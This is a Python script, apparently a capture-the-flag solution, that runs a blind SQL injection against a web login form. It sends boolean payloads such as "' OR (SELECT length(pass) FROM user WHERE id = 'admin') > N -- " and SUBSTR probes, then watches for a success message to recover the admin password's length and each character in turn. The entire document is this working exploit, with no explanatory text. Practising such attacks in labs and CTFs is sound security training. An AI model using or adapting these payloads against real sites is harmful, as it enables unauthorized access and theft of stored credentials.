import requests
import string


def blind_sql_injection(url):
    letters = string.digits + string.ascii_letters
    password = ''
    length = 0
    for i in range(32):
        response = requests.post(
            url,
            {
                "id": "admin",
                "pass": "' OR (SELECT length(pass) FROM user WHERE id = 'admin') > " + str(6 + i) + " -- "
            }
        )
        if not ("Congratulations!" in response.text):
            print("length = " + str(i + 1))
            length = i + 1
            break
    for i in range(length):
        for c in letters:
            response = requests.post(
                url,
                {
                    "id": "admin",
                    "pass": "' OR SUBSTR((SELECT pass FROM user WHERE id = 'admin'), "
                            + str(6 + i) + ", 1) = '" + c + "' -- "
                }
            )
            if "Congratulations!" in response.text:
                password += c
                print("{0} : {1}".format(i, password))
                break
    print("flag = FLAG_" + password)
